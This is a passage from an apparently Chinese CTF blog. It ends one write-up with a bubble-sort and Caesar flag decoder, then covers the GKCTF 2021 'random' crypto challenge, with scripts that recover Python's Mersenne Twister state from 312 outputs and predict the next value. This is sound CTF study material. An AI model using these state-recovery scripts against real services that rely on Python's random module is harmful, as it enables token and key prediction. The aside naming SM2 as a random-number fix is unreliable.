class="number">23</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">52</span>, <span class="number">30</span>, <span class="number">2</span>, <span class="number">78</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">73</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">51</span>, <span class="number">62</span>, <span class="number">25</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">87</span>],[<span class="number">24</span>, <span class="number">86</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">51</span>, <span class="number">53</span>, <span class="number">47</span>, <span class="number">16</span>, <span class="number">40</span>, <span class="number">94</span>, <span class="number">98</span>, <span class="number">88</span>, <span class="number">64</span>, <span class="number">41</span>, <span class="number">83</span>, <span class="number">44</span>, <span class="number">35</span>, <span class="number">45</span>, <span class="number">75</span>, <span class="number">17</span>, <span class="number">46</span>],[<span class="number">33</span>, <span class="number">12</span>, <span class="number">63</span>, <span class="number">77</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">47</span>, <span class="number">58</span>, <span class="number">6</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">27</span>, <span class="number">21</span>, <span class="number">96</span>, <span class="number">92</span>, <span class="number">50</span>, <span class="number">82</span>, <span class="number">76</span>, <span class="number">5</span>, <span class="number">62</span>, <span class="number">56</span>, <span class="number">44</span>],[<span class="number">12</span>, <span class="number">36</span>, <span class="number">16</span>, <span class="number">44</span>, <span class="number">19</span>, <span class="number">62</span>, <span class="number">43</span>, <span class="number">80</span>, <span class="number">58</span>, <span class="number">98</span>, <span class="number">69</span>, <span class="number">97</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">49</span>, <span class="number">26</span>, <span class="number">70</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">48</span>],[<span class="number">51</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">98</span>, <span class="number">33</span>, <span class="number">78</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">99</span>, <span class="number">84</span>, <span class="number">80</span>, <span class="number">93</span>, <span class="number">37</span>, <span class="number">56</span>, <span class="number">77</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">94</span>, <span class="number">52</span>, <span class="number">88</span>],[<span class="number">80</span>, <span class="number">38</span>, <span class="number">88</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">40</span>, <span class="number">70</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">76</span>, <span class="number">18</span>, <span class="number">57</span>, <span class="number">73</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">33</span>, <span class="number">17</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">77</span>, <span class="number">67</span>],[<span class="number">18</span>, <span class="number">53</span>, <span class="number">14</span>, <span class="number">24</span>, <span class="number">94</span>, <span class="number">42</span>, <span class="number">61</span>, <span class="number">75</span>, <span class="number">62</span>, <span class="number">60</span>, <span class="number">73</span>, <span class="number">2</span>, <span class="number">65</span>, <span class="number">48</span>, <span class="number">80</span>, <span class="number">23</span>, <span class="number">44</span>, <span class="number">91</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">71</span>],[<span class="number">16</span>, <span class="number">54</span>, <span class="number">87</span>, <span class="number">75</span>, <span class="number">8</span>, <span class="number">23</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">22</span>, <span class="number">63</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">25</span>, <span class="number">6</span>, <span class="number">84</span>, <span class="number">80</span>, <span class="number">4</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">42</span>, <span class="number">14</span>, <span class="number">43</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble</span>(<span class="params">n</span>):</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)-<span class="number">1</span>, i, -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> n[j] &lt; n[j-<span class="number">1</span>]:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                t = n[j]</span><br><span class="line">                n[j] = n[j-<span class="number">1</span>]</span><br><span class="line">                n[j-<span class="number">1</span>] = t</span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(bubble(l)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">synt&#123;jrypbzr_gb_arjfpgs&#125;</span><br></pre></td></tr></table></figure>

<p>然后凯撒一下得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;welcome_to_newsctf&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>团队WP</tag>
      </tags>
  </entry>
  <entry>
    <title>20210626 GKCTFCrypto方向部分复现</title>
    <url>/posts/2d82e8aa/</url>
    <content><![CDATA[<p>26号，那天考操作系统，没有参加；27下午考完计网，想要复现一下</p>
<span id="more"></span>

<h1 id="GKCTF"><a href="#GKCTF" class="headerlink" title="GKCTF"></a>GKCTF</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>BUU已经上题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-39773b44.png" alt="20210626GKCTF-39773b44.png"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-f8641481.png" alt="20210626GKCTF-f8641481.png"></p>
<p>这次的应急杯Crypto有三道，Reverse有五道。根据解出的人数，今日任务就复现下两道解出人数最多的题目吧</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-c525e5a0.png" alt="20210626GKCTF-c525e5a0.png"></p>
<h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-0436bb67.png" alt="20210626GKCTF-0436bb67.png"></p>
<p>代码如下，因为总是在原文件上操作，重下了好多次，下次记得新建一个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mask</span>():</span></span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;random.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>):</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">64</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">96</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    file.close()</span><br><span class="line">get_mask()</span><br><span class="line">flag = md5(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>)).encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>生成的文本文件如下，里面有312个随机数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2584323193</span><br><span class="line">1099154419438958164</span><br><span class="line">35367876945070316311325317953</span><br><span class="line">481304047</span><br><span class="line">12782770146993102006</span><br><span class="line">24789628292419559503661788402</span><br><span class="line">2776391832</span><br><span class="line">9046887565683900291</span><br><span class="line">50006261016517120573540241998</span><br><span class="line">4167723109</span><br><span class="line">8540277546428614473</span><br><span class="line">5932047064656933473553742683</span><br><span class="line">2951765291</span><br><span class="line">10958280862127627756</span><br><span class="line">61364239380151547478360346674</span><br><span class="line">727043053</span><br><span class="line">10156271057154381198</span><br><span class="line">32168336768992329620376069852</span><br><span class="line">930821842</span><br><span class="line">16276235036285538859</span><br><span class="line">9299952556848430743503551046</span><br><span class="line">2868231632</span><br><span class="line">5239154873841417200</span><br><span class="line">11073503953912227254738321705</span><br><span class="line">3452646652</span><br><span class="line">8203253126417399900</span><br><span class="line">52795367131471301612397944513</span><br><span class="line">1927997107</span><br><span class="line">17486869700317373240</span><br><span class="line">47859970254711877167132319582</span><br><span class="line">1459348891</span><br><span class="line">9270456490024856463</span><br><span class="line">74988967035830352654888842228</span><br><span class="line">3714813644</span><br><span class="line">1001128959491001919</span><br><span class="line">8338265486641240510773094199</span><br><span class="line">1430706700</span><br><span class="line">17510828220752339511</span><br><span class="line">3163106687132931419335230580</span><br><span class="line">663535320</span><br><span class="line">9606088298064978425</span><br><span class="line">42511409828594385595915384953</span><br><span class="line">908684643</span><br><span class="line">5421916296165007941</span><br><span class="line">9630914642938890694059952508</span><br><span class="line">2209941143</span><br><span class="line">14999144064788271892</span><br><span class="line">3764842169035734035997078921</span><br><span class="line">2718456651</span><br><span class="line">8541807093002241064</span><br><span class="line">70305992075768658972224974121</span><br><span class="line">930303353</span><br><span class="line">887596273180600202</span><br><span class="line">62528479418364179541352908078</span><br><span class="line">3365397759</span><br><span class="line">15219084820731944344</span><br><span class="line">31433566654697222176709895388</span><br><span class="line">1608992428</span><br><span class="line">6417140575231408939</span><br><span class="line">12879789575923814684090165215</span><br><span class="line">2811970399</span><br><span class="line">6123213785028348335</span><br><span class="line">44681647388937033220521089118</span><br><span class="line">1260870056</span><br><span class="line">5601104844042776691</span><br><span class="line">73199461252301674455633950458</span><br><span class="line">883231057</span><br><span class="line">17783480959798771462</span><br><span class="line">53460694547508318015132953966</span><br><span class="line">1332985617</span><br><span class="line">6673661714524041073</span><br><span class="line">54253348096650113440476985084</span><br><span class="line">3911521675</span><br><span class="line">3438383273755779719</span><br><span class="line">50129032267969019444282164464</span><br><span class="line">3311412816</span><br><span class="line">8779405363908462634</span><br><span class="line">77818642029003078860467063235</span><br><span class="line">4204237422</span><br><span class="line">17534771551489868719</span><br><span class="line">47280916590275648057356977963</span><br><span class="line">2090173606</span><br><span class="line">12206397967662831376</span><br><span class="line">9495602410639024810670107439</span><br><span class="line">2896231201</span><br><span class="line">7246124017447704664</span><br><span class="line">64467120363081017096405905335</span><br><span class="line">392254334</span><br><span class="line">12789011750322942845</span><br><span class="line">5247110397471141497763090834</span><br><span class="line">814200188</span><br><span class="line">14344105251896958923</span><br><span class="line">38888779745538270252730950782</span><br><span class="line">205529919</span><br><span class="line">13939756220516981581</span><br><span class="line">67139045733351688501202495914</span><br><span class="line">3563698832</span><br><span class="line">16840754399626540384</span><br><span class="line">15354843719521267197455444900</span><br><span class="line">1386481456</span><br><span class="line">17766886653399976694</span><br><span class="line">61203331542727632580855864074</span><br><span class="line">2032518919</span><br><span class="line">2355401958853696908</span><br><span class="line">58793908005730868677649498244</span><br><span class="line">3991002745</span><br><span class="line">6506506581713943242</span><br><span class="line">49187675946469291318483292566</span><br><span class="line">2346942877</span><br><span class="line">994297989736899070</span><br><span class="line">45437626728896532873251413177</span><br><span class="line">3841694984</span><br><span class="line">14253899037419430689</span><br><span class="line">8435766077661599453131339442</span><br><span class="line">1679990328</span><br><span class="line">5515793210854183190</span><br><span class="line">32981467195097563488749918497</span><br><span class="line">744869832</span><br><span class="line">11965860903258650511</span><br><span class="line">73456728458781563185478913274</span><br><span class="line">1341354796</span><br><span class="line">14941036303190219170</span><br><span class="line">3601563989190071059996878006</span><br><span class="line">3361509481</span><br><span class="line">17629804697469609923</span><br><span class="line">39935200308805986497519634478</span><br><span class="line">213152541</span><br><span class="line">18320881664493742431</span><br><span class="line">35325602739583757661562537619</span><br><span class="line">2583841550</span><br><span class="line">13763800051589427155</span><br><span class="line">24638499459902141689405229579</span><br><span class="line">1930742512</span><br><span class="line">2392210857598517491</span><br><span class="line">10441235412645941387574306751</span><br><span class="line">461860348</span><br><span class="line">2960745717639761142</span><br><span class="line">62671223148116753112168252981</span><br><span class="line">342206006</span><br><span class="line">6480900103080233462</span><br><span class="line">68412521040142848818877222548</span><br><span class="line">114798494</span><br><span class="line">8473329380799862296</span><br><span class="line">13698669860489083061204052132</span><br><span class="line">2900249131</span><br><span class="line">4183161143099214314</span><br><span class="line">18705391538460150746163889528</span><br><span class="line">3766817970</span><br><span class="line">12378384893542868384</span><br><span class="line">55065668763750424532726429526</span><br><span class="line">937387269</span><br><span class="line">6844068130337459179</span><br><span class="line">3209183745118985928581969258</span><br><span class="line">3341723085</span><br><span class="line">5988612409695647387</span><br><span class="line">74389503837936256104231536479</span><br><span class="line">4240599755</span><br><span class="line">15332231015110371140</span><br><span class="line">62955965591068690743297262172</span><br><span class="line">1555895753</span><br><span class="line">6058791220464667520</span><br><span class="line">38335642957673073804843192014</span><br><span class="line">810331063</span><br><span class="line">4826913432979346480</span><br><span class="line">28611765156689124521247554769</span><br><span class="line">2630955218</span><br><span class="line">12776823600930336401</span><br><span class="line">4939603509311727391894886152</span><br><span class="line">3280912700</span><br><span class="line">14886149455945180990</span><br><span class="line">52545650130177883790984384989</span><br><span class="line">2356751225</span><br><span class="line">2213402912509116749</span><br><span class="line">7670693824287789893690942739</span><br><span class="line">1599077432</span><br><span class="line">14059140725965938936</span><br><span class="line">16912587144697957583184157226</span><br><span class="line">1304928684</span><br><span class="line">9448367331308980026</span><br><span class="line">22467661289496622162065003733</span><br><span class="line">2001054151</span><br><span class="line">7669140498758745837</span><br><span class="line">39387592809285963406216440474</span><br><span class="line">1711960460</span><br><span class="line">3944628516045148813</span><br><span class="line">66275496498554499967007163069</span><br><span class="line">1207238325</span><br><span class="line">3474935157030029491</span><br><span class="line">63309877710388250418928028870</span><br><span class="line">759170859</span><br><span class="line">5858654703302236387</span><br><span class="line">47609248816278271537847269046</span><br><span class="line">1571940308</span><br><span class="line">8335124609741508060</span><br><span class="line">63542562244865676783377908343</span><br><span class="line">1103531693</span><br><span class="line">673654248555391502</span><br><span class="line">30211221866217572233934551180</span><br><span class="line">1089271924</span><br><span class="line">7205932443049001486</span><br><span class="line">69303844715341292680611559319</span><br><span class="line">78608136</span><br><span class="line">3404862937733764913</span><br><span class="line">4259499119552843766282799518</span><br><span class="line">2856032696</span><br><span class="line">18313272414884625578</span><br><span class="line">13693483738598197670400133831</span><br><span class="line">873953734</span><br><span class="line">7709221139118742639</span><br><span class="line">34347437826101106015248365081</span><br><span class="line">1783225370</span><br><span class="line">16395574393179667285</span><br><span class="line">7105819215807952823387139051</span><br><span class="line">4039492686</span><br><span class="line">16956581102357069698</span><br><span class="line">57880199206788615132959351746</span><br><span class="line">4151578751</span><br><span class="line">2089635663127651746</span><br><span class="line">37224845035383461896791495968</span><br><span class="line">3139901611</span><br><span class="line">7354140220471025697</span><br><span class="line">7677374435615054008235674795</span><br><span class="line">2008633712</span><br><span class="line">13970520912420834879</span><br><span class="line">64431013803082441566118213963</span><br><span class="line">1788996018</span><br><span class="line">16490194110734000780</span><br><span class="line">30074301251997624246501473245</span><br><span class="line">2460472485</span><br><span class="line">2420976394683211164</span><br><span class="line">63223457068346692358441841920</span><br><span class="line">83976303</span><br><span class="line">11597367904222552300</span><br><span class="line">541189103864720560882255271</span><br><span class="line">1271705896</span><br><span class="line">8355873362347678325</span><br><span class="line">6344182152495584455275136810</span><br><span class="line">516191728</span><br><span class="line">14301559481738139949</span><br><span class="line">56972815139785900061169383374</span><br><span class="line">3206833632</span><br><span class="line">10471460817277304217</span><br><span class="line">48253348743985600958199235128</span><br><span class="line">4093394606</span><br><span class="line">18421023127368906484</span><br><span class="line">3209763791222301851974194188</span><br><span class="line">2294793393</span><br><span class="line">5804188421524711527</span><br><span class="line">71797815201668391465761200460</span><br><span class="line">3776041666</span><br><span class="line">4108093307245233290</span><br><span class="line">36986873094794981638319354001</span><br><span class="line">1123598142</span><br><span class="line">18262625851690101956</span><br><span class="line">75211342463083839154547686361</span><br><span class="line">1000669502</span><br><span class="line">18244976169672436911</span><br><span class="line">72759872679663719847870853888</span><br><span class="line">2863001571</span><br><span class="line">18304840778989692776</span><br><span class="line">22413497817784765711206417816</span><br><span class="line">1497794697</span><br><span class="line">11739492739170519132</span><br><span class="line">67625171938756611423023578679</span><br><span class="line">3351136254</span><br><span class="line">11816001323328933293</span><br><span class="line">68942708548438536419919996191</span><br><span class="line">1327110822</span><br><span class="line">1299589815565305619</span><br><span class="line">62081225258542372826911047279</span><br><span class="line">3410663545</span><br><span class="line">13158537297009141542</span><br><span class="line">21762078985419016317415112411</span><br><span class="line">1245509971</span><br><span class="line">8804545967037621189</span><br><span class="line">12841311881373962346628325162</span><br><span class="line">2090373367</span><br><span class="line">5289193049949531539</span><br><span class="line">58444176241871300895472370959</span><br><span class="line">571136405</span><br><span class="line">2357132884718584788</span><br><span class="line">51271731657715979715595461713</span><br><span class="line">1432929573</span><br><span class="line">503683219995130744</span><br><span class="line">42705435265543268884777575518</span><br><span class="line">1452726104</span><br><span class="line">2295689344585140511</span><br><span class="line">56996373195070838495288737642</span><br><span class="line">187502663</span><br><span class="line">13760641334049999515</span><br><span class="line">64971355271690455751992498230</span><br><span class="line">2679386081</span><br><span class="line">172294286357194222</span><br><span class="line">78658263482976308261205349174</span><br><span class="line">2643925505</span><br><span class="line">9627451492376735719</span><br><span class="line">44487428240561493246393172961</span><br><span class="line">983662371</span><br><span class="line">2375149476902080328</span><br><span class="line">39784456552690724305541938380</span><br><span class="line">3306946267</span><br><span class="line">16316178008270132149</span><br><span class="line">76712503805317876365091515524</span><br><span class="line">3779008319</span><br><span class="line">4892998918237451139</span><br><span class="line">46329724632809073972496761660</span><br><span class="line">3841865427</span><br><span class="line">15115042473603448600</span><br><span class="line">34888855489304037538590108588</span><br><span class="line">585968278</span><br><span class="line">15088560943809914475</span><br><span class="line">46621092548977030580425482842</span><br></pre></td></tr></table></figure>

<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>之前看到这种题目，可能我还会有点惊奇，随机数都能给你爆出来；现在做过一些题之后，发现这是一个常考的点，python等一些语言产生伪随机数的算法很多都是基于MT19937（Mersenne twister）梅森旋转算法</p>
<p>简单来说，MT19937有624个状态，利用这624个不同的状态生产随机数（当然不是624个随机数），也就是说知道连续产生的624个随机数就可以通过状态预测下一个随机数，<em>这也顺便解释了为什么做密码学项目时，不能用这些语言自带的随机函数，而是要用SM2，伪随机确实太危险了</em></p>
<p>而之前做过的<a href="https://blog.csdn.net/m0_49109277/article/details/117324488?spm=1001.2014.3001.5501">[SUCTF2019]MT</a>就是MT类型的题，这里比较简单（我乱说的）直接搜脚本了</p>
<h4 id="脚本搜集"><a href="#脚本搜集" class="headerlink" title="脚本搜集"></a>脚本搜集</h4><p>市面上主流的脚本，愣是给我看蒙了</p>
<blockquote>
<p>randcrack</p>
</blockquote>
<p>有像2020网鼎杯的，产生了32位的随机数700个，思路参上</p>
<p>照他样子改的脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;random.txt&#x27;</span>,<span class="string">&#x27;r+&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">  lines = fp.readlines()</span><br><span class="line"></span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    rc.submit(<span class="built_in">int</span>(line.strip()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>):</span><br><span class="line">  a = rc.predict_randrange(<span class="number">32</span>)</span><br><span class="line">  b = rc.predict_randrange(<span class="number">64</span>)</span><br><span class="line">  c = rc.predict_randrange(<span class="number">96</span>)</span><br><span class="line"></span><br><span class="line">key = rc.predict_randrange(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(md5(<span class="built_in">str</span>(key).encode()).hexdigest())</span><br></pre></td></tr></table></figure>

<p>主要是用到了randcrack的库，看名字就是用来碰撞随机数的；但是可惜报错时我才意识到，题目给的只有312个数字，和624差两倍关系</p>
<blockquote>
<p>MT19937Recover</p>
</blockquote>
<p>还有一类脚本是定义了MT19937Recover的类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MT19937Recover</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Reverses the Mersenne Twister based on 624 observed outputs.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The internal state of a Mersenne Twister can be recovered by observing</span></span><br><span class="line"><span class="string">    624 generated outputs of it. However, if those are not directly</span></span><br><span class="line"><span class="string">    observed following a twist, another output is required to restore the</span></span><br><span class="line"><span class="string">    internal index.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    See also https://en.wikipedia.org/wiki/Mersenne_Twister#Pseudocode .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unshiftRight</span>(<span class="params">self, x, shift</span>):</span></span><br><span class="line">        res = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            res = x ^ res &gt;&gt; shift</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unshiftLeft</span>(<span class="params">self, x, shift, mask</span>):</span></span><br><span class="line">        res = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            res = x ^ (res &lt;&lt; shift &amp; mask)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">untemper</span>(<span class="params">self, v</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot; Reverses the tempering which is applied to outputs of MT19937 &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        v = self.unshiftRight(v, <span class="number">18</span>)</span><br><span class="line">        v = self.unshiftLeft(v, <span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">        v = self.unshiftLeft(v, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">        v = self.unshiftRight(v, <span class="number">11</span>)</span><br><span class="line">        <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">go</span>(<span class="params">self, outputs, forward=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Reverses the Mersenne Twister based on 624 observed values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            outputs (List[int]): list of &gt;= 624 observed outputs from the PRNG.</span></span><br><span class="line"><span class="string">                However, &gt;= 625 outputs are required to correctly recover</span></span><br><span class="line"><span class="string">                the internal index.</span></span><br><span class="line"><span class="string">            forward (bool): Forward internal state until all observed outputs</span></span><br><span class="line"><span class="string">                are generated.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Returns a random.Random() object.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        result_state = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(outputs) &gt;= <span class="number">624</span>  <span class="comment"># need at least 624 values</span></span><br><span class="line"></span><br><span class="line">        ivals = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">            ivals.append(self.untemper(outputs[i]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(outputs) &gt;= <span class="number">625</span>:</span><br><span class="line">            <span class="comment"># We have additional outputs and can correctly</span></span><br><span class="line">            <span class="comment"># recover the internal index by bruteforce</span></span><br><span class="line">            challenge = outputs[<span class="number">624</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">626</span>):</span><br><span class="line">                state = (<span class="number">3</span>, <span class="built_in">tuple</span>(ivals + [i]), <span class="literal">None</span>)</span><br><span class="line">                r = random.Random()</span><br><span class="line">                r.setstate(state)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> challenge == r.getrandbits(<span class="number">32</span>):</span><br><span class="line">                    result_state = state</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># With only 624 outputs we assume they were the first observed 624</span></span><br><span class="line">            <span class="comment"># outputs after a twist --&gt;  we set the internal index to 624.</span></span><br><span class="line">            result_state = (<span class="number">3</span>, <span class="built_in">tuple</span>(ivals + [<span class="number">624</span>]), <span class="literal">None</span>)</span><br><span class="line">        rand = random.Random()</span><br><span class="line">        rand.setstate(result_state)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> forward:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>, <span class="built_in">len</span>(outputs)):</span><br><span class="line">                <span class="keyword">assert</span> rand.getrandbits(<span class="number">32</span>) == outputs[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> rand</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_PythonMT19937Recover</span>():</span></span><br><span class="line">    mtb = MT19937Recover()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;random.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        lines = fp.readlines()</span><br><span class="line">        lines = [<span class="built_in">int</span>(_.strip()) <span class="keyword">for</span> _ <span class="keyword">in</span> lines]</span><br><span class="line">    r2 = mtb.go(lines)</span><br><span class="line">    <span class="built_in">print</span>(r2.getrandbits(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test_PythonMT19937Recover()</span><br></pre></td></tr></table></figure>

<p>但是还是不行，看注释介绍，人家本来就是用来基于624个已知状态的</p>
<blockquote>
<p>MT19937Predictor</p>
</blockquote>
<p>已经放弃了，完全不知道在只知道一半状态的情况下怎么玩，一直坐等到看到别人战队的WP</p>
<p>先看看改编后成功的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> mt19937predictor <span class="keyword">import</span> MT19937Predictor</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;random.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    lines = fp.readlines()</span><br><span class="line">line = [<span class="built_in">int</span>(_.strip()) <span class="keyword">for</span> _ <span class="keyword">in</span> lines]</span><br><span class="line">Predictor = MT19937Predictor()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>):</span><br><span class="line">    Predictor.setrandbits(line[i*<span class="number">3</span>], <span class="number">32</span>)</span><br><span class="line">    Predictor.setrandbits(line[i*<span class="number">3</span>+<span class="number">1</span>], <span class="number">64</span>)</span><br><span class="line">    Predictor.setrandbits(line[i*<span class="number">3</span>+<span class="number">2</span>], <span class="number">96</span>)</span><br><span class="line"></span><br><span class="line">key = Predictor.getrandbits(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(md5(<span class="built_in">str</span>(key).encode()).hexdigest())</span><br></pre></td></tr></table></figure>

<p>在运行过程中，用到了mt19937predictor的库，是一个github上的脚本，拿来学习学习</p>
